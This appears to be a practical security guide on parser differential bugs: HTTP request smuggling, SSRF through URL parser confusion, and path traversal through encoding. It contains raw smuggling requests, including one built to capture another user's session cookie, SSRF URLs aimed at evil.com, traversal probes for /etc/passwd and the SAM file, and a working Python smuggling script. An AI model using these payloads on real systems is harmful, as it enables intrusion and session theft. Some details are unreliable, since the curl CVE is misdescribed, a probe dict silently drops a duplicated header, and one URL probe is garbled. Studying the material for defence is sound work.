# Parser Differential Vulnerability Guide

A practical guide for understanding and hunting parser differential vulnerabilities—where two systems interpret the same input differently, creating security gaps.

## Table of Contents

- [Overview](#overview)
- [The Fundamental Pattern](#the-fundamental-pattern)
- [HTTP Request Smuggling Deep Dive](#http-request-smuggling-deep-dive)
  - [CL.TE Attack](#clte-attack)
  - [TE.CL Attack](#tecl-attack)
  - [Real-World CVEs](#real-world-cves)
- [URL Parser Differentials](#url-parser-differentials)
  - [SSRF via Parser Confusion](#ssrf-via-parser-confusion)
- [Path Parser Differentials](#path-parser-differentials)
- [Pattern Recognition: Where Else to Look](#pattern-recognition-where-else-to-look)
- [Attack Surfaces](#attack-surfaces)
- [Tools & Methodology](#tools--methodology)
- [Legal & Ethical Considerations](#legal--ethical-considerations)

---

## Overview

Parser differential vulnerabilities occur when two or more components in a system interpret the same input differently. The attacker crafts input that:
- Looks benign to the security component (WAF, proxy, validator)
- Looks malicious to the backend (actual processor)

Or vice versa—input that bypasses a frontend to reach a backend that processes it differently.

### Foundational Examples

| CVE | Products | Category | Impact |
|-----|----------|----------|--------|
| CVE-2023-25690 | Apache HTTP Server | HTTP Smuggling | Request smuggling via mod_proxy |
| CVE-2021-22947 | curl | URL Parsing | SSRF via URL confusion |
| CVE-2023-44487 | HTTP/2 implementations | Protocol | Rapid Reset DoS |
| CVE-2020-11984 | Apache HTTP Server | Path Parsing | SSRF/disclosure |
| CVE-2021-21287 | MinIO | URL Parsing | SSRF via parser differential |

### Why These Bugs Keep Recurring

- **Specification ambiguity** — RFCs leave room for interpretation
- **Defense in depth creates layers** — Each layer parses independently
- **Optimization shortcuts** — Parsers take liberties for performance
- **Legacy compatibility** — "Be liberal in what you accept"
- **Different languages/libraries** — Each implements parsing differently

---

## The Fundamental Pattern

```
THE CORE CONCEPT:

                    SAME INPUT
                        │
            ┌───────────┴───────────┐
            ▼                       ▼
    ┌───────────────┐       ┌───────────────┐
    │   Parser A    │       │   Parser B    │
    │   (Security)  │       │   (Backend)   │
    └───────────────┘       └───────────────┘
            │                       │
            ▼                       ▼
    ┌───────────────┐       ┌───────────────┐
    │ Interpretation│       │ Interpretation│
    │      X        │       │      Y        │
    └───────────────┘       └───────────────┘

    When X ≠ Y, attacker controls the gap
```

### The Three Parser Differential Patterns

```
PATTERN 1: SECURITY BYPASS
─────────────────────────────────────────────────────────
Input:  "GET /admin HTTP/1.1"  (with obfuscation)

WAF sees:     "GET /adm%69n HTTP/1.1"  → Not /admin, ALLOW
Backend sees: "GET /admin HTTP/1.1"     → Decoded, EXECUTE

Result: WAF bypass


PATTERN 2: REQUEST SMUGGLING
─────────────────────────────────────────────────────────
Input contains TWO requests hidden as one

Frontend sees: 1 request  → Forwards to backend
Backend sees:  2 requests → Processes both

Result: Second request bypasses frontend controls


PATTERN 3: BOUNDARY CONFUSION
─────────────────────────────────────────────────────────
Input: Ambiguous where data starts/ends

Parser A: Sees boundary at position X
Parser B: Sees boundary at position Y

Result: Data interpreted in wrong context
```

---

## HTTP Request Smuggling Deep Dive

HTTP smuggling exploits disagreement between frontend and backend on where one request ends and another begins. The two primary mechanisms are:

- **Content-Length (CL)**: Specifies body size in bytes
- **Transfer-Encoding (TE)**: Chunked encoding, size per chunk

### CL.TE Attack

Frontend uses Content-Length, backend uses Transfer-Encoding.

```
MALICIOUS REQUEST:
─────────────────────────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

─────────────────────────────────────────────────────────

WHAT FRONTEND SEES (Content-Length: 13):
┌─────────────────────────────────────────────────────────┐
│ POST / HTTP/1.1                                         │
│ Host: vulnerable-site.com                               │
│ Content-Length: 13                                      │
│ Transfer-Encoding: chunked                              │
│                                                         │
│ Body: "0\r\n\r\nSMUGGLED"  (13 bytes)                   │
└─────────────────────────────────────────────────────────┘
Frontend sees ONE complete request, forwards everything.


WHAT BACKEND SEES (Transfer-Encoding: chunked):
┌─────────────────────────────────────────────────────────┐
│ POST / HTTP/1.1                                         │
│ Headers...                                              │
│                                                         │
│ Chunk 1: "0" = zero-length chunk = END OF REQUEST       │
└─────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────┐
│ SMUGGLED                                                │
│ (Start of NEXT request!)                                │
└─────────────────────────────────────────────────────────┘

Backend processes TWO requests. "SMUGGLED" becomes the 
beginning of the next request, which gets combined with
the NEXT legitimate user's request.
```

#### CL.TE Exploitation: Stealing Requests

```
ATTACKER SENDS:
─────────────────────────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 116
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

data=

─────────────────────────────────────────────────────────

NEXT VICTIM'S REQUEST:
GET /profile HTTP/1.1
Host: vulnerable.com
Cookie: session=SECRET123

─────────────────────────────────────────────────────────

WHAT BACKEND RECEIVES:

Request 1: POST / HTTP/1.1 (attacker's wrapper)
           Body: empty (chunked says 0)

Request 2: POST /capture HTTP/1.1
           Content-Length: 1000
           Body starts with: "data="
           
           Backend waits for 1000 bytes...
           Victim's request arrives...
           Backend appends it to body:
           
           "data=GET /profile HTTP/1.1\r\n
            Host: vulnerable.com\r\n
            Cookie: session=SECRET123\r\n..."

Attacker retrieves captured data from /capture endpoint.
```

### TE.CL Attack

Frontend uses Transfer-Encoding, backend uses Content-Length.

```
MALICIOUS REQUEST:
─────────────────────────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 15

x=1
0


─────────────────────────────────────────────────────────

WHAT FRONTEND SEES (Transfer-Encoding):

Chunk 1: size=0x5c (92 bytes)
         "GPOST / HTTP/1.1\r\nHost: vulnerable-site.com\r\n
          Content-Length: 15\r\n\r\nx=1"
Chunk 2: size=0 (end)

ONE complete chunked request, forwards all.


WHAT BACKEND SEES (Content-Length: 4):

Request 1 body: "5c\r\n" (4 bytes exactly)

Then backend sees NEW request starting with:
"GPOST / HTTP/1.1..."

Wait - "GPOST"? Backend reads the "G" as end of body,
leaves "POST / HTTP/1.1..." as start of next request.
```

### TE.TE: Obfuscated Transfer-Encoding

When both systems use TE, attackers obfuscate to make one ignore it:

```
OBFUSCATION TECHNIQUES:
─────────────────────────────────────────────────────────

Transfer-Encoding: xchunked
Transfer-Encoding : chunked        (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: X[\n]Transfer-Encoding: chunked (header injection)
Transfer-Encoding
 : chunked                         (line folding)
Transfer-encoding: chunked         (case variation)

Each proxy/server handles these differently.
One may see "chunked", another may not.
```

### Real-World CVEs

#### CVE-2023-25690: Apache mod_proxy Smuggling

```
VULNERABLE CONFIGURATION:
RewriteRule "^/here/(.*)" "http://backend/$1" [P]
ProxyPassReverse /here/ http://backend/

ATTACK:
GET /here/path%20HTTP/1.1%0d%0aHost:%20evil%0d%0a%0d%0aGET%20/admin HTTP/1.1
Host: vulnerable.com

BECOMES ON BACKEND:
GET /path HTTP/1.1
Host: evil

GET /admin HTTP/1.1
Host: vulnerable.com

Smuggled request to /admin bypasses frontend auth.
```

#### CVE-2022-32215: Node.js llhttp Smuggling

```
MALICIOUS REQUEST:

POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked

1
A
0
 
GET /admin HTTP/1.1
Host: target

The space after "0" confused llhttp's chunk parser.
Frontend: One request
Node.js backend: Two requests
```

---

## URL Parser Differentials

URL parsing is surprisingly complex. Different parsers disagree on:
- Authority vs path boundaries
- Encoded character handling
- Unicode normalization
- Special characters (@, #, ?)

### The URL Structure

```
     userinfo       host      port
        ┌──┴───┐ ┌────┴────┐ ┌┴┐
https://user:pass@example.com:8080/path?query=1#fragment
└─┬─┘   └───────────┬───────────┘└──┬──┘└───┬───┘└───┬───┘
scheme          authority         path    query   fragment

CONFUSION POINTS:
- Where does userinfo end and host begin? (@)
- What if @ appears multiple times?
- What if path contains encoded slashes?
- How is unicode in hostname handled?
```

### SSRF via Parser Confusion

#### The @ Symbol Attack

```
ATTACK URL:
http://expected.com@evil.com/path

PARSER A (security check):
  "expected.com" is in allowlist ✓ ALLOW

PARSER B (actual request):
  userinfo: expected.com
  host: evil.com
  → Connects to evil.com!

WHY IT WORKS:
RFC 3986 defines @ as userinfo delimiter.
"expected.com" becomes the username.
"evil.com" is the actual host.
```

#### Fragment Confusion

```
ATTACK URL:
http://evil.com#@expected.com/

PARSER A:
  Sees: expected.com (after @)
  
PARSER B:
  host: evil.com
  fragment: @expected.com/
  → Connects to evil.com!

Fragment is client-side only, never sent to server.
```

#### Encoded Characters

```
ATTACK URL:
http://expected.com%2f@evil.com/

%2f = encoded /

PARSER A (decodes first):
  Sees: expected.com/@evil.com
  Host: expected.com ✓

PARSER B (parses first):
  Sees @ as delimiter
  Host: evil.com ✗

ORDER OF OPERATIONS MATTERS:
  Decode then parse ≠ Parse then decode
```

### CVE-2021-22947: curl URL Confusion

```
ATTACK:
curl "http://example.com%2f@evil.com/"

curl's URL parser:
  Decoded %2f before parsing authority
  Saw: http://example.com/@evil.com/
  Connected to: example.com
  Path: /@evil.com/

BUT: Other parsers in the chain (proxy, WAF) 
saw evil.com as the host.

This differential enabled SSRF bypasses.
```

---

## Path Parser Differentials

### Path Traversal via Encoding

```
ATTACK PATH:
/files/..%2f..%2f..%2fetc/passwd

PARSER A (WAF, checks raw):
  No "../" found ✓ ALLOW
  
PARSER B (backend, decodes):
  Decodes to: /files/../../../etc/passwd
  Resolves to: /etc/passwd
  
RESULT: Path traversal bypasses WAF
```

### Double Encoding

```
/files/..%252f..%252f..%252fetc/passwd

%25 = encoded %
%252f = encoded %2f = double-encoded /

Layer 1 decodes: /files/..%2f..%2f..%2fetc/passwd
Layer 2 decodes: /files/../../../etc/passwd

If WAF decodes once and backend decodes twice → bypass
```

### Backslash vs Forward Slash

```
WINDOWS PATH CONFUSION:
/files/..\..\..\..\windows\system32\config\sam

Unix WAF: 
  Backslash is literal character, not path separator
  No traversal detected ✓

Windows backend:
  Backslash IS path separator
  Resolves traversal → File access

SIMILAR: Mixed slashes
/files/..\/..\/..\/ 
```

### Null Byte Injection (Legacy)

```
ATTACK: /files/valid.pdf%00.jpg

Parser A (checks extension):
  Extension: .jpg ✓ Allowed type

Parser B (C-based, opens file):
  Null byte terminates string
  Opens: /files/valid.pdf

Legacy issue but still found in:
- Older PHP
- Native code behind web apps
- Embedded devices
```

---

## Pattern Recognition: Where Else to Look

### Parser Differential Locations

```
LOCATION               DIFFERENTIAL                ATTACK
─────────────────────────────────────────────────────────────
CDN → Origin           HTTP parsing                Request smuggling
WAF → Backend          Path interpretation         Bypass + traversal
Proxy → Server         Header handling             Smuggling, SSRF
API Gateway → Service  URL parsing                 Auth bypass, SSRF
Browser → Server       URL encoding                Open redirect, XSS
Email Gateway → MTA    Header parsing              Spoofing, injection
XML Parser → Schema    Entity handling             XXE, injection
JSON parsers           Duplicate key handling      Logic bypass
JWT libraries          Header parsing              Algorithm confusion
```

### Common Differential Triggers

```
AMBIGUOUS INPUTS TO TEST:
─────────────────────────────────────────────────────────────

HTTP Headers:
- Duplicate headers (which wins?)
- Header with space before colon
- Bare CR or LF (not CRLF)
- Null bytes in headers
- Invalid Content-Length values
- Both CL and TE present

URLs:
- Multiple @ symbols
- Encoded special chars (%2f, %23, %3f)
- Unicode characters
- Backslash variations
- Fragment/query ambiguity
- IPv6 with zone ID

Paths:
- Double encoding
- Mixed slashes
- Path segment: . and ..
- Null bytes
- Unicode normalization
- Case sensitivity differences

Data Formats:
- Duplicate JSON keys
- Comments in JSON
- Unicode escapes
- Trailing data after valid parse
- Nested depth limits
```

### Methodology: Finding Differentials

```
1. IDENTIFY THE CHAIN
   Map all components that parse your input:
   Client → CDN → WAF → Load Balancer → App Server → Framework

2. FINGERPRINT EACH PARSER
   Send probes to identify parser quirks:
   - Error messages reveal parser identity
   - Timing differences on malformed input
   - Behavior on edge cases

3. FIND DISAGREEMENTS
   Systematically test ambiguous inputs:
   - What does each parser do with [X]?
   - Document differences
   
4. WEAPONIZE THE GAP
   Craft input that:
   - Passes security parser (looks benign)
   - Exploits backend parser (does harm)
```

---

## Attack Surfaces

### CDN and Load Balancer Chains

| Frontend | Backend | Historical Issues |
|----------|---------|-------------------|
| Cloudflare | Apache | TE.CL smuggling |
| Akamai | nginx | Header handling |
| AWS ALB | Any | Hop-by-hop headers |
| HAProxy | Apache | Chunked parsing |

### Language-Specific URL Parsers

| Language | Library | Known Quirks |
|----------|---------|--------------|
| Python | urllib | Fragment handling |
| Node.js | url module | Unicode issues |
| Java | java.net.URL | Authority parsing |
| PHP | parse_url | Userinfo handling |
| Go | net/url | Opaque URLs |

### Request Smuggling Targets

| Product | Test For |
|---------|----------|
| Apache mod_proxy | Encoded path smuggling |
| nginx | Chunked + Content-Length |
| HAProxy | TE obfuscation |
| Varnish | Chunked parsing |
| Squid | Pipeline confusion |

---

## Tools & Methodology

### Detection Tools

```bash
# HTTP Smuggling detection
smuggler.py -u https://target.com

# Burp Suite extensions
# - HTTP Request Smuggler
# - Param Miner

# URL parsing differential tester
# https://github.com/nickclareburt/url-parsing-tester
```

### Manual Testing

```python
#!/usr/bin/env python3
"""Parser differential probe generator"""

SMUGGLE_PROBES = [
    # CL.TE basic
    {
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nX"
    },
    # TE.CL basic  
    {
        "headers": {
            "Content-Length": "4",
            "Transfer-Encoding": "chunked",
        },
        "body": "1\r\nZ\r\n0\r\n\r\n"
    },
    # TE obfuscation
    {
        "headers": {
            "Transfer-Encoding": "chunked",
            "Transfer-Encoding": "x",
        },
        "body": "0\r\n\r\n"
    },
]

URL_PROBES = [
    "http://allowed.com@evil.com/",
    "http://evil.com#@allowed.com/",
    "http://allowed.com%[email protected]/",
    "http://allowed.com:80@evil.com/",
    "http://[::1]@allowed.com/",
]

PATH_PROBES = [
    "../etc/passwd",
    "..%2fetc/passwd",
    "..%252fetc/passwd",
    "..%c0%afetc/passwd",  # Overlong UTF-8
    "..\\etc\\passwd",
    "....//etc/passwd",
]
```

### Timing-Based Detection

```
DETECT SMUGGLING VIA TIMING:

1. Send request that would smuggle partial second request:
   POST / HTTP/1.1
   Content-Length: 4
   Transfer-Encoding: chunked
   
   1\r\nA\r\nX    (X is start of "next request")

2. If backend uses TE:
   - Sees complete chunked request
   - Responds immediately

3. If backend uses CL:
   - Reads "1\r\nA" as body (4 bytes)
   - "X" starts next request
   - Backend waits for more data
   - TIMEOUT = vulnerable to TE.CL
```

---

## Proof of Concept: Full Smuggling Attack

```python
#!/usr/bin/env python3
"""
HTTP Request Smuggling - CL.TE Demonstration
For educational purposes only - test only on systems you own
"""

import socket
import ssl

def clte_smuggle(host, port=443):
    """
    Demonstrate CL.TE smuggling.
    Smuggles a GET /admin request.
    """
    
    # The smuggled request
    smuggled = (
        "GET /admin HTTP/1.1\r\n"
        "Host: {}\r\n"
        "X-Ignore: "  # Will absorb next request's first line
    ).format(host)
    
    # Calculate Content-Length for frontend
    # Body seen by CL: "0\r\n\r\n" + smuggled
    body = "0\r\n\r\n" + smuggled
    
    request = (
        "POST / HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: {}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "{}"
    ).format(host, len(body), body)
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        if port == 443:
            sock = context.wrap_socket(sock, server_hostname=host)
        
        sock.send(request.encode())
        response = sock.recv(4096)
        
        return response.decode('utf-8', errors='replace')
        
    finally:
        sock.close()


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <host>")
        sys.exit(1)
    
    print(clte_smuggle(sys.argv[1]))
```

---

## Legal & Ethical Considerations

### Do
- Only test systems you own or have authorization
- Follow responsible disclosure
- Use timing-based detection to avoid disruption

### Don't
- Smuggle requests to other users' sessions
- Cause denial of service
- Test production systems without permission

### Relevant Laws
- US: Computer Fraud and Abuse Act (CFAA)
- EU: Computer Misuse Directive
- Request smuggling can affect other users → extra legal risk

---

## References

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [RFC 7230: HTTP/1.1 Message Syntax](https://tools.ietf.org/html/rfc7230)
- [RFC 3986: URI Syntax](https://tools.ietf.org/html/rfc3986)
- [A New Era of SSRF (Orange Tsai)](https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [HTTP Desync Attacks (James Kettle)](https://portswigger.net/research/http-desync-attacks)

---

*Document Version: 1.0*
*Last Updated: January 2025*
